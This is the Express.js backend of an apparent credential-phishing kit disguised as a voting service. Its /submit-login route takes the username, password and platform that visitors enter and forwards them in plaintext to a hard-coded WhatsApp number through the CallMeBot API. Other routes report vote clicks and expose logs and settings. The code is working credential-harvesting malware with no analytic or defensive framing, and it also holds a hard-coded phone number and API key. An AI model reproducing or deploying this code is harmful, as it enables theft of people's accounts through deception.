// -------------------- Dependencies --------------------
const express = require("express");
const cors = require("cors");
const axios = require("axios");

// -------------------- App Setup --------------------
const app = express();
app.use(cors());
app.use(express.json());

// Handle preflight requests for all routes
app.options("*", cors());

const PORT = process.env.PORT || 5000;
const API_KEY = "1738514";
const PHONE_NUMBER = "+2349035958143";

// -------------------- In-Memory Storage --------------------
let votes = [];
let settings = {
  requireSecurityCode: false,
  maintenanceMode: false,
};

// -------------------- Helper Function --------------------
async function sendWhatsApp(message) {
  try {
    const url = "https://api.callmebot.com/whatsapp.php";
    const response = await axios.get(url, {
      params: { phone: PHONE_NUMBER, text: message, apikey: API_KEY },
      validateStatus: () => true, // Treat all statuses as valid
    });
    return response.data;
  } catch (err) {
    console.error("WhatsApp API error:", err.message);
    throw err;
  }
}

// -------------------- API Routes --------------------

// Root route - friendly HTML page
app.get("/", (req, res) => {
  res.send(`
    <h1>✅ Backend is running!</h1>
    <p>Available routes:</p>
    <ul>
      <li>POST /submit-login</li>
      <li>POST /submit-vote</li>
      <li>GET /logs</li>
      <li>GET /settings</li>
      <li>POST /settings</li>
    </ul>
  `);
});

// Submit login/code
app.post("/submit-login", async (req, res) => {
  const { username, password, platform } = req.body;
  const message = `New voter logged in to ${platform}\nUsername: ${username}\nPassword: ${password}`;

  try {
    votes.push({ username, platform, action: "login", time: new Date() });
    const apiResponse = await sendWhatsApp(message);
    res.json({ success: true, msg: "Login received and sent to WhatsApp!", apiResponse });
  } catch (err) {
    res.status(500).json({ success: false, error: "Failed to send WhatsApp message" });
  }
});

// Submit vote click
app.post("/submit-vote", async (req, res) => {
  const { platform } = req.body;
  const message = `Someone wants to vote with ${platform}`;

  try {
    votes.push({ username: "n/a", platform, action: "clicked", time: new Date() });
    const apiResponse = await sendWhatsApp(message);
    res.json({ success: true, msg: "Vote received and sent to WhatsApp!", apiResponse });
  } catch (err) {
    res.status(500).json({ success: false, error: "Failed to send WhatsApp message" });
  }
});

// -------------------- Admin Routes --------------------

// Get logs
app.get("/logs", (req, res) => {
  res.json(votes.map(v => ({ ...v, time: v.time.toISOString() })));
});

// Get settings
app.get("/settings", (req, res) => res.json(settings));

// Update settings
app.post("/settings", (req, res) => {
  const { key, value } = req.body;
  if (!(key in settings)) return res.status(400).json({ error: "Invalid setting" });

  settings[key] = value;
  res.json({ success: true, settings });
});

// -------------------- Catch-All --------------------
app.all("*", (req, res) => {
  res.status(404).json({ error: "Route not found" });
});

// -------------------- Start Server --------------------
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));